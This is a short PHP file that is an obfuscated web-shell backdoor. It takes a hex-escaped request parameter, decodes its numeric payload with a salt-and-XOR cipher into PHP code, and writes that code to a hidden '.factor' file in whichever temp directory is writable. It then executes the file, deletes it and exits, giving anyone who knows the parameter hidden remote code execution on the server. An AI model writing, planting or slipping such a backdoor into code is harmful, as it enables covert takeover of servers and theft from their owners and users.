<?php

if(in_array("e\x6Ce\x6D", array_keys($_REQUEST))){
	$pgrp = $_REQUEST["e\x6Ce\x6D"];
	 	$pgrp		 =	explode	 (	 '.' 	,  $pgrp)	;
	$pointer = '';
            $salt3 = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen = strlen(	$salt3);
            $p = 0;
    
            foreach(	$pgrp as $v8) {
                $sChar = ord(	$salt3[$p % $sLen]);
                $dec =(	(	int)$v8 - $sChar -(	$p % 10)) ^ 	22;
                $pointer 	.=  chr(	$dec);
                $p++;
            }
	$flg = array_filter(["/var/tmp", session_save_path(), getenv("TMP"), getcwd(), "/tmp", ini_get("upload_tmp_dir"), "/dev/shm", getenv("TEMP"), sys_get_temp_dir()]);
	for ($record = 0, $bind = count($flg); $record < $bind; $record++) {
    $entity = $flg[$record];
    		if (!( !is_dir($entity) || !is_writable($entity) )) {
    $value = implode("/", [$entity, ".factor"]);
    if (file_put_contents($value, $pointer)) {
	require $value;
	unlink($value);
	exit;
}
}
}
}